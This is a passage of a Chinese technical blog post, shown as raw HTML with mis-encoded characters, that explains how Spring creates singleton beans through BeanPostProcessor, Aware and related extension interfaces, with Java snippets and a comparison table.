data-draft-id="7600326947505897524" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring æºç åˆ†æ  å•ä¾‹ Bean çš„åˆ›å»ºè¿‡ç¨‹"/> <meta itemprop="keywords" content="Spring Boot,Spring,åç«¯"/> <meta itemprop="datePublished" content="2026-02-09T07:48:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æš®è‰²å¦–å¨†ä¸¶"/> <meta itemprop="url" content="https://juejin.cn/user/4292946760307655"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring æºç åˆ†æ  å•ä¾‹ Bean çš„åˆ›å»ºè¿‡ç¨‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4292946760307655/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æš®è‰²å¦–å¨†ä¸¶
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T07:48:19.000Z" title="Mon Feb 09 2026 07:48:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»14åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>ä¸Šç¯‡æ–‡ç« æˆ‘ä»¬è®²è¿°äº† <code>BeanFactoryPostProcessor</code> çš„ä½œç”¨ï¼Œè¿™ç¯‡æ–‡ç« æˆ‘ä»¬æ¥å­¦ä¹ å•ä¾‹ <code>Bean</code> çš„åˆ›å»ºè¿‡ç¨‹ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠäº† <code>BeanPostProcessor ã€Awareã€ InitializingBean</code> ç­‰é‡è¦çš„æ¥å£ï¼Œæ˜¯ç”Ÿå‘½å‘¨æœŸçš„æ ¸å¿ƒç‚¹ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬åç»­è‡ªå®šä¹‰æ‰©å±•éœ€è¦ç†Ÿæ‚‰çš„æ ¸å¿ƒæ¥å£ã€‚</p>
<p>æœ¬ç¯‡æ–‡ç« ä½¿ç”¨çš„ <code>SpringBoot</code> ç‰ˆæœ¬æ˜¯ <code>3.4.1</code> ï¼Œå¯¹åº” <code>Spring</code> ç‰ˆæœ¬ <code>6.2.1</code>ã€‚</p>
<h2 data-id="heading-1">SpringBoot &amp; Spring æ¶æ„å›¾ç¤ºæ¦‚è§ˆ</h2>
<p>è¿™é‡Œæˆ‘ä»¥ <code>SpringBoot</code> æºç å…¥å£ä¸ºèµ·ç‚¹ï¼Œç”»äº†ä¸€ä¸ªç›¸å…³çš„æµç¨‹å›¾ï¼ŒåŒ…å«äº† <code>SpringBootã€Spring äº‹åŠ¡ã€Spring AOPã€Spring äº‹ä»¶ã€BeanFactoryPostProcessorã€BeanPostProcessor</code> ç­‰æ‰€æœ‰ <code>Spring</code> çŸ¥è¯†ï¼Œä»¥åŠç›¸å…³æ¨¡å—ä¹‹é—´çš„äº¤äº’è”ç³»ï¼Œåç»­ä¹Ÿä¼šæŒç»­æ›´æ–°æ­¤å›¾ï¼ˆå› ä¸ºæˆ‘è‡ªå·±è¿˜æ²¡æœ‰å­¦å®Œï¼‰ï¼Œæˆ‘è¯•äº†ä¸‹ä½œè€…ä¾§è¿™è¾¹æ›´æ–°åï¼Œåˆ†äº«çš„åä½œé“¾æ¥ä¹Ÿä¼šå®æ—¶å˜æ›´ï¼Œå¸Œæœ›å¯¹å¤§å®¶æœ‰å¸®åŠ©</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.processon.com%2Fv%2F696465e679c29354e9e50f69" target="_blank" title="https://www.processon.com/v/696465e679c29354e9e50f69" ref="nofollow noopener noreferrer">SpringBoot &amp; Spring æ¶æ„å›¾ æŒç»­æ›´æ–°</a> å¯¹äºå³å°†éœ€è¦é¢è¯•çš„åŒå­¦åº”è¯¥ä¼šæ¯”è¾ƒæœ‰å¸®åŠ©ï¼</p>
<h2 data-id="heading-2">Bean çš„åˆ›å»ºè¿‡ç¨‹&amp;ç”Ÿå‘½å‘¨æœŸå›¾ç¤º</h2>
<p><code>Bean</code> çš„ç”Ÿå‘½å‘¨æœŸä»ä¸Šå¾€ä¸‹ï¼Œå¦‚å›¾</p>
<div align="center"> <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6a9653fac67c4af28e1173a7b6fe69d0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pqu6Imy5aaW5aiG5Li2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771228098&amp;x-signature=NBVxPCwpsqX%2FdxKoiFuI1wFfVhE%3D" alt="å›¾ç‰‡æè¿°" width="800" loading="lazy"/> </div>

<p>å…¶å®å¾ˆå¤šäººå¯èƒ½çœ‹ç€ç½‘ä¸Šçš„æ•™ç¨‹ï¼Œå„ç§è¯´ <code>Bean</code> çš„ç”Ÿå‘½å‘¨æœŸï¼Œä»€ä¹ˆå›è°ƒå‡½æ•°ï¼Œä»€ä¹ˆåç½®å¤„ç†ï¼Œç¬¬ä¸€æ¬¡æ¥è§¦å¯èƒ½ä¼šçœ‹ç€æœ‰ç‚¹æ‡µé€¼ï¼Œè‡ªå·±éƒ½ä¸çŸ¥é“è‡ªå·±åœ¨å¹²ä»€ä¹ˆï¼Œä¹Ÿä¸çŸ¥é“è¿™æ ·åšçš„æ„ä¹‰ã€‚</p>
<p><strong>å…¶å®å¾ˆç®€å•ï¼Œ å°±æ˜¯ä¸€ä¸ª Bean ä»åˆ›å»ºåˆ°å®Œæˆçš„è¿‡ç¨‹ä¸­ä¼šè°ƒç”¨ä¸€æ‰¹å›ºå®šçš„æ–¹æ³•ï¼Œè¿™æ‰¹å›ºå®šçš„æ–¹æ³•å­˜åœ¨äºä¸åŒçš„æ¥å£ä¸­ï¼Œè¿™æ˜¯ä¸ºäº†ä»£ç ç›´è§‚ï¼Œå’Œåˆ†å±‚è®¾è®¡ï¼Œè€Œæˆ‘ä»¬ç†Ÿæ‚‰äº†è¿™ä¸ªè¿‡ç¨‹ä¸­å„ç§æ¥å£çš„ä½œç”¨å’Œè°ƒç”¨é¡ºåºï¼Œå°±å¯ä»¥åœ¨æ—¥å¸¸ä½¿ç”¨ Spring æ¡†æ¶æ—¶ï¼Œæ ¹æ®ä¸šåŠ¡éœ€æ±‚åšå‡ºå„ç§å„æ ·çš„è‡ªå®šä¹‰æ‰©å±•ã€‚</strong></p>
<p>ä¸‹é¢æˆ‘ä»¬ä¸€ä¸€è¯´æ˜è¿™äº›æ¥å£çš„ä½œç”¨ã€‚</p>
<h2 data-id="heading-3">BeanPostProcessor é¡¶å±‚æ¥å£</h2>
<p>é¡¶å±‚åç½®å¤„ç†å™¨æ¥å£ï¼ŒæŸ¥è¯¢æ¥å£çš„æ³¨é‡Šï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ªå›è°ƒæ–¹æ³•ã€‚æä¾›ä¸¤ä¸ªæ–¹æ³•è®©å­ç±»æ‰©å±•ï¼Œä½œç”¨æ—¶æœºæ˜¯åœ¨ <code>Bean</code> åˆ›å»ºè¿‡ç¨‹ä¸­è¢«è°ƒç”¨</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * Bean åˆå§‹åŒ–å‰è°ƒç”¨
 */</span>
<span class="hljs-keyword">default</span> Object <span class="hljs-title function_">postProcessBeforeInitialization</span><span class="hljs-params">(Object bean, String beanName)</span> <span class="hljs-keyword">throws</span> BeansException {
    <span class="hljs-keyword">return</span> bean;
}

<span class="hljs-comment">/**
 * Bean åˆå§‹åŒ–åè°ƒç”¨
 */</span>
<span class="hljs-keyword">default</span> Object <span class="hljs-title function_">postProcessAfterInitialization</span><span class="hljs-params">(Object bean, String beanName)</span> <span class="hljs-keyword">throws</span> BeansException {
    <span class="hljs-keyword">return</span> bean;
}
</code></pre>
<p>ä¸Šä¸€æ®µç”Ÿå‘½å‘¨æœŸå›¾ä¸­æ ‡é¢œè‰²çš„æ­¥éª¤ï¼Œå…¨éƒ½æ˜¯å®ƒæˆ–è€…å®ƒçš„æ‰©å±•æ¥å£ã€‚</p>
<h2 data-id="heading-4">BeanPostProcessor å’Œ BeanFactoryPostProcessor</h2>
<p>è¿™ä¸¤ä¸ªå¤„ç†å™¨åå­—å¾ˆç›¸ä¼¼ï¼Œä½†æ˜¯ä½œç”¨å¤§ä¸ç›¸åŒï¼Œä¸‹å›¾åˆ—å‡ºäº†å®ƒä»¬çš„åŒºåˆ«</p>


















































<table><thead><tr><th>æ¥å£</th><th>BeanFactoryPostProcessor</th><th>BeanPostProcessor</th></tr></thead><tbody><tr><td><strong>ä½œç”¨é˜¶æ®µ</strong></td><td>Bean å®šä¹‰åŠ è½½é˜¶æ®µï¼ŒBean å®ä¾‹åŒ–å‰</td><td>Bean å®ä¾‹åŒ–åï¼Œåˆå§‹åŒ–å‰å</td></tr><tr><td><strong>å¤„ç†ç›®æ ‡</strong></td><td>BeanDefinitionï¼ˆBean çš„å…ƒæ•°æ®ï¼‰</td><td>Bean å®ä¾‹å¯¹è±¡</td></tr><tr><td><strong>æ¥å£æ–¹æ³•</strong></td><td><code>postProcessBeanFactory()</code> <br/> <code>...å­æ¥å£</code></td><td><code>postProcessBeforeInitialization()</code><br/><code>postProcessAfterInitialization()</code><br/> <code>...å­æ¥å£</code></td></tr><tr><td><strong>ä¸»è¦åŠŸèƒ½</strong></td><td>ä¿®æ”¹ã€æ·»åŠ ã€åˆ é™¤ BeanDefinition</td><td>ä¿®æ”¹ã€åŒ…è£…ã€ä»£ç† Bean å®ä¾‹</td></tr><tr><td><strong>æ‰§è¡Œæ—¶æœº</strong></td><td>Spring å®¹å™¨å¯åŠ¨æ—©æœŸ</td><td>æ¯ä¸ª Bean çš„ç”Ÿå‘½å‘¨æœŸä¸­ï¼Œåˆå§‹åŒ–å‰å</td></tr><tr><td><strong>æ‰§è¡Œæ¬¡æ•°</strong></td><td>æ•´ä¸ªå®¹å™¨å¯åŠ¨è¿‡ç¨‹æ‰§è¡Œä¸€æ¬¡</td><td>æ¯ä¸ª Bean å®ä¾‹åŒ–åéƒ½ä¼šæ‰§è¡Œä¸¤æ¬¡ï¼ˆå‰åå„ä¸€æ¬¡ï¼Œä¸åŒ…æ‹¬æ‰©å±•æ¥å£ï¼‰</td></tr><tr><td><strong>è®¿é—®æƒé™</strong></td><td>å¯è®¿é—®æ‰€æœ‰ BeanDefinitionï¼Œå¯ä¿®æ”¹å®¹å™¨é…ç½®</td><td>åªèƒ½è®¿é—®å½“å‰å¤„ç†çš„ Bean å®ä¾‹ï¼Œä¸èƒ½ä¿®æ”¹å®¹å™¨é…ç½®</td></tr><tr><td><strong>å¸¸è§å®ç°</strong></td><td>ConfigurationClassPostProcessorï¼ˆå¤„ç†é…ç½®ç±»ï¼‰</td><td>AutowiredAnnotationBeanPostProcessorï¼ˆå¤„ç†@Autowired æ³¨å…¥ï¼‰<br/></td></tr></tbody></table>
<h2 data-id="heading-5">MergedBeanDefinitionPostProcessor</h2>
<p>å’Œ <code>BeanFactoryPostProcessor</code> çš„æ‰©å±•æ¥å£ <code>BeanDefinitionRegistryPostProcessor</code> ç±»ä¼¼ï¼Œ<code>MergedBeanDefinitionPostProcessor</code> æ˜¯ <code>BeanPostProcessor</code> çš„å­æ¥å£ï¼Œåœ¨ <code>BeanPostProcessor</code> çš„ä¸¤ä¸ªæ–¹æ³•æ‰§è¡Œå‰ï¼Œåœ¨ <code>Bean</code> å®šä¹‰åˆå¹¶åï¼Œä¼šæ‰§è¡Œ <code>MergedBeanDefinitionPostProcessor.postProcessMergedBeanDefinition()</code></p>
<blockquote>
<p><code>Spring</code> ä¼šæ ¹æ® <code>BeanDefinition</code> åˆ›å»º <code>Bean</code>ï¼Œä½†æ˜¯æœ€ç»ˆ <code>BeanDefinition</code> å¿…é¡»è¢«è½¬æˆ <code>RootBeanDefinition</code> ï¼Œ<code>Bean</code> åˆå¹¶çš„è¿‡ç¨‹å°±æ˜¯æŠŠä¸åŒç±»å‹çš„ <code>BeanDefinition</code> è½¬æˆ <code>RootBeanDefinition</code>ï¼Œä»¥åŠåˆå¹¶ä¸€äº›çˆ¶ç±»å±æ€§å’Œæ–¹æ³•ç­‰ï¼Œå¾—åˆ°ä¸€ä¸ªæœ€ç»ˆçš„ <code>BeanDefinition</code>ã€‚</p>
</blockquote>
<p>å…¸å‹çš„å®ç°æ˜¯ <code>AutowiredAnnotationBeanPostProcessor</code>ï¼Œ åœ¨é‡å†™çš„ <code>postProcessMergedBeanDefinition()</code> æ–¹æ³•ä¸­ç¼“å­˜äº†å½“å‰ <code>Bean</code> æ‰€éœ€è¦æ³¨å…¥çš„å…¶ä»– <code>Bean</code> çš„ç›¸å…³ä¿¡æ¯ã€‚ä¾‹å¦‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EventListenerTestService1</span> {
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ApplicationEventPublisher publisher;
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> CashRepayApplyMapper cashRepayApplyMapper;
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> EventListenerTestService2 listenerTestService2;
}
</code></pre>
<p>é‚£ä¹ˆåœ¨åˆ›å»º <code>EventListenerTestService1</code> çš„ <code>Bean</code> å¯¹è±¡çš„è¿‡ç¨‹ä¸­ï¼Œå°±ä¼šè°ƒç”¨ <code>postProcessMergedBeanDefinition()</code> æ–¹æ³•ï¼Œç¼“å­˜è¿™ä¸‰ä¸ªæ ‡æ³¨äº† <code>@Autowired</code> çš„ç±»ç›¸å…³ä¿¡æ¯ï¼Œåé¢è¿›è¡Œä¾èµ–æ³¨å…¥çš„æ—¶å€™ä¼šç›´æ¥ä»ç¼“å­˜å–ç±»ä¿¡æ¯ï¼Œç„¶åè¿›è¡Œåˆ›å»ºè¿™ä¸‰ä¸ªæˆå‘˜å˜é‡çš„ <code>Bean</code> å®ä¾‹</p>
<h2 data-id="heading-6">InstantiationAwareBeanPostProcessor</h2>
<p>å®ƒä¹Ÿæ˜¯ <code>BeanPostProcessor</code> çš„å­æ¥å£ï¼Œæ‰©å±•äº†ä¸€ä¸ª <code>postProcessProperties()</code>ï¼Œç»å…¸çš„å®ç°ä¹Ÿæ˜¯ <code>AutowiredAnnotationBeanPostProcessor</code> åœ¨è¿™é‡Œè·å– <code>postProcessMergedBeanDefinition()</code> æ–¹æ³•ä¸­ç¼“å­˜çš„æ³¨å…¥ä¿¡æ¯ï¼Œè¿›è¡Œå®é™…ä¾èµ–æ³¨å…¥ï¼Œè¿™ä¸€æ­¥å®Œæˆä¹‹åï¼Œå½“å‰ <code>EventListenerTestService1</code> çš„ä¸‰ä¸ªæˆå‘˜å˜é‡éƒ½åˆ›å»ºäº†å¯¹åº”çš„ <code>Bean</code> å¯¹è±¡</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> PropertyValues <span class="hljs-title function_">postProcessProperties</span><span class="hljs-params">(PropertyValues pvs, Object bean, String beanName)</span> {
    <span class="hljs-type">InjectionMetadata</span> <span class="hljs-variable">metadata</span> <span class="hljs-operator">=</span> findAutowiringMetadata(beanName, bean.getClass(), pvs);
    <span class="hljs-keyword">try</span> {
       <span class="hljs-comment">//æ³¨å…¥ @Autowired æˆå‘˜</span>
       metadata.inject(bean, beanName, pvs);
    }
    <span class="hljs-comment">//......</span>
    <span class="hljs-keyword">return</span> pvs;
}
</code></pre>
<p>åœ¨ <code>metadata.inject(bean, beanName, pvs)</code> è¿™ä¸€æ­¥ä¼šå…ˆä» <code>ApplicationContext</code> ä¸­å¯»æ‰¾å·²å­˜åœ¨çš„ç¬¦åˆçš„ <code>Bean</code>ï¼Œå¦‚æœæ‰¾ä¸åˆ°ä¼šèµ°åˆ›å»º <code>Bean</code> çš„æµç¨‹ï¼Œè¿™æ˜¯ä¸€ä¸ªé€’å½’ï¼Œå¦‚æœéœ€è¦åˆ›å»ºçš„ <code>Bean</code> å†…éƒ¨ä¹Ÿæœ‰ä¾èµ–ï¼Œä¼šç»§ç»­é€’å½’åˆ›å»ºã€‚å‚è€ƒ</p>
<ul>
<li><code>AbstractAutowireCapableBeanFactory#populateBean</code></li>
<li><code>â†“</code></li>
<li><code>AutowiredAnnotationBeanPostProcessor#postProcessProperties</code></li>
<li><code>â†“</code></li>
<li><code>DefaultListableBeanFactory#doResolveDependency</code></li>
<li><code>â†“</code></li>
<li><code>AbstractBeanFactory#getBean</code> å¼€å§‹é€’å½’</li>
</ul>
<h2 data-id="heading-7">SmartInstantiationAwareBeanPostProcessor</h2>
<p>å®ƒæ˜¯ <code>InstantiationAwareBeanPostProcessor</code> çš„æ‰©å±•æ¥å£ï¼ŒæŸ¥çœ‹è¿™ä¸ªç±»çš„æ³¨é‡Šï¼Œå‘Šè¯‰æˆ‘ä»¬è¿™ä¸ªç±»æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ‰©å±•ï¼Œé€šå¸¸æ¥è¯´åªç”¨äºæ¡†æ¶å†…éƒ¨ï¼Œå¦‚æœæˆ‘ä»¬ä¸šåŠ¡éœ€è¦æ‰©å±•åº”è¯¥ç›´æ¥å®ç° <code>BeanPostProcessor</code> ã€‚å®ƒæ–°å¢äº†å‡ ä¸ªæ‰©å±•æ–¹æ³•ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SmartInstantiationAwareBeanPostProcessor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InstantiationAwareBeanPostProcessor</span> {
    <span class="hljs-comment">/**
     * è·å–æ—©æœŸå¼•ç”¨ï¼ˆä¸‰çº§ç¼“å­˜ã€ä»£ç†çš„å®ç°ï¼‰
     */</span>
    <span class="hljs-keyword">default</span> Object <span class="hljs-title function_">getEarlyBeanReference</span><span class="hljs-params">(Object bean, String beanName)</span> <span class="hljs-keyword">throws</span> BeansException {
       <span class="hljs-keyword">return</span> bean;
    }
</code></pre>
<p><code>AbstractAutoProxyCreator</code> æ˜¯å®ƒçš„ç»å…¸å®ç°ï¼Œ<code>getEarlyBeanReference()</code> å°±æ˜¯ä¸ºäº†è§£å†³å¾ªç¯ä¾èµ–è¿‡ç¨‹ä¸­ï¼Œè¢«ä¾èµ–çš„ <code>Bean</code> éœ€è¦ä»£ç†ã€‚æœ€å¸¸è§çš„æƒ…å†µæ˜¯æˆ‘ä»¬çš„ <code>Bean</code> æœ‰äº‹åŠ¡ï¼Œ<code>Spring</code> äº‹åŠ¡æ˜¯éœ€è¦é€šè¿‡ä»£ç†æ¥å®ç°çš„ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">//org.springframework.aop.framework.autoproxy.AbstractAutoProxyCreator#getEarlyBeanReference</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getEarlyBeanReference</span><span class="hljs-params">(Object bean, String beanName)</span> {
    <span class="hljs-type">Object</span> <span class="hljs-variable">cacheKey</span> <span class="hljs-operator">=</span> getCacheKey(bean.getClass(), beanName);
    <span class="hljs-built_in">this</span>.earlyBeanReferences.put(cacheKey, bean);
    <span class="hljs-keyword">return</span> wrapIfNecessary(bean, beanName, cacheKey);
}
</code></pre>
<h2 data-id="heading-8">Aware</h2>
<p><code>Aware</code> æ˜¯ä¸€ä¸ªé‡è¦é€šçŸ¥æ¥å£ï¼Œç¿»è¯‘ä¸­æ–‡ä¸º <code>æ„è¯†åˆ°</code>ï¼ŒæŸ¥çœ‹æ³¨é‡Šè¯´å®ƒæ˜¯ä¸€ä¸ªé¡¶å±‚æ ‡è®°æ¥å£ï¼Œè¡¨ç¤º <code>Bean</code> å¯ä»¥é€šè¿‡å›è°ƒæ–¹å¼è¢« <code>Spring</code> å®¹å™¨é€šçŸ¥æŸä¸ªå¯¹è±¡ã€‚å®é™…çš„æ–¹æ³•ç­¾åç”±å„ä¸ªå­æ¥å£å†³å®šï¼Œä½†é€šå¸¸åº”åªå®šä¹‰ä¸€ä¸ªå•ä¸ªå…¥å‚çš„ <code>void</code> æ–¹æ³•ã€‚ä¾‹å¦‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ApplicationContextAware</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Aware</span> {
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">setApplicationContext</span><span class="hljs-params">(ApplicationContext applicationContext)</span> <span class="hljs-keyword">throws</span> BeansException;
}
</code></pre>
<p>å®ƒçš„ä½œç”¨æ˜¯ç»™æˆ‘ä»¬çš„ <code>Bean</code> è®¾ç½®ä¸€äº›æ¡†æ¶å†…éƒ¨å¯¹è±¡ï¼Œé˜²æ­¢æˆ‘ä»¬æ‰©å±•çš„æ¥å£éœ€è¦è¿™äº›å¯¹è±¡ï¼Œä¾‹å¦‚</p>
<ul>
<li>å½“å‰ä¸Šä¸‹æ–‡ <code>ApplicationContext</code></li>
<li>å½“å‰ <code>BeanFactory</code></li>
<li>å½“å‰ <code>Bean</code> çš„åå­—</li>
<li>å½“å‰ç¯å¢ƒå¯¹è±¡ <code>Environment</code></li>
<li>å½“å‰äº‹ä»¶å‘å¸ƒå™¨ <code>ApplicationEventPublisher</code></li>
<li>ç­‰ç­‰</li>
</ul>
<p>å‚è€ƒå…¸å‹çš„å®ç° <code>ApplicationContextAwareã€EnvironmentAware</code>ï¼Œè®©æˆ‘ä»¬çš„ <code>Bean</code> å®ç° <code>EnvironmentAware</code> ï¼Œå°±å¯ä»¥åœ¨æˆ‘ä»¬ <code>Bean</code> è¿™ä¸ªç±»ä¸­è·å–åˆ° <code>Environment</code> å¯¹è±¡ä½¿ç”¨</p>
<h2 data-id="heading-9">BeanPostProcessor#postProcessBeforeInitialization</h2>
<p><code>Bean</code> åˆå§‹åŒ–è¿‡ç¨‹å‰æ‰§è¡Œï¼Œ<code>Aware</code> è°ƒç”¨ä¹‹åæ‰§è¡Œ ã€‚ä¸€ä¸ªå…¸å‹çš„å®ç°æ˜¯ <code>ApplicationContextAwareProcessor</code>ï¼Œç”±äºä¸Šä¸€æ­¥è°ƒç”¨<code>invokeAwareMethods</code>ï¼Œåªåˆ¤æ–­äº†ä¸‰ç§ç±»å‹</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invokeAwareMethods</span><span class="hljs-params">(String beanName, Object bean)</span> {
    <span class="hljs-keyword">if</span> (bean <span class="hljs-keyword">instanceof</span> Aware) {
       <span class="hljs-keyword">if</span> (bean <span class="hljs-keyword">instanceof</span> BeanNameAware beanNameAware) {
          beanNameAware.setBeanName(beanName);
       }
       <span class="hljs-keyword">if</span> (bean <span class="hljs-keyword">instanceof</span> BeanClassLoaderAware beanClassLoaderAware) {
          <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">bcl</span> <span class="hljs-operator">=</span> getBeanClassLoader();
          <span class="hljs-keyword">if</span> (bcl != <span class="hljs-literal">null</span>) {
             beanClassLoaderAware.setBeanClassLoader(bcl);
          }
       }
       <span class="hljs-keyword">if</span> (bean <span class="hljs-keyword">instanceof</span> BeanFactoryAware beanFactoryAware) {
          beanFactoryAware.setBeanFactory(AbstractAutowireCapableBeanFactory.<span class="hljs-built_in">this</span>);
       }
    }
</code></pre>
